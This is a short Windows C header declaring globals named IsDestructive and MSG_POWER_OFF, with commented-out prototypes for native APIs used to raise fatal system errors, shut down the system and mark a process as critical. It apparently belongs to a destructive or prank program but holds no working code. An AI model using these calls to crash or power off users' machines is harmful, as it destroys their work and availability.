#pragma once

#include "resource.h"
//#pragma comment(lib, "ntdll.lib")

extern HINSTANCE hInst;
extern BOOLEAN IsDestructive;
extern BOOLEAN MSG_POWER_OFF;
extern HWND hWnds[51];



/*
extern PRTLADJUSTPRIVILEGE RtlAdjustPrivilege;
extern PRTLINITUNICODESTRING RtlInitUnicodeString;
extern PNTRAISEHARDERROR NtRaiseHardError;
extern PNTSHUTDOWNSYSTEM NtShutdownSystem;
extern PNTSETINFORMATIONPROCESS NtSetInformationProcess;*/

//#else
/*
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(
    IN ULONG Privilege,
    IN BOOLEAN Enable,
    IN BOOLEAN Client,
    OUT PBOOLEAN PreviousValue OPTIONAL
);

EXTERN_C void NTAPI RtlInitUnicodeString(
    OUT PUNICODE_STRING DestinationString,
    IN PCWSTR SourceString
);


EXTERN_C NTSTATUS NTAPI NtRaiseHardError(
    IN NTSTATUS ErrorStatus,
    IN ULONG NumberOfParameters,
    IN DWORD UnicodeStringParameterMask OPTIONAL,
    IN PVOID Parameters,
    IN HARDERROR_RESPONSE_OPTION ResponseOptions,
    OUT PHARDERROR_RESPONSE Response
);

EXTERN_C NTSTATUS NTAPI NtShutdownSystem(
    IN SHUTDOWN_ACTION ShutdownAction
);

EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(
    HANDLE            ProcessHandle,
    DWORD             ProcessInformationClass,
    PVOID             ProcessInformation,
    ULONG             ProcessInformationLength
);*/

//#endif


//PRTLSETPROCESSISCRITICAL RtlSetProcessIsCritical;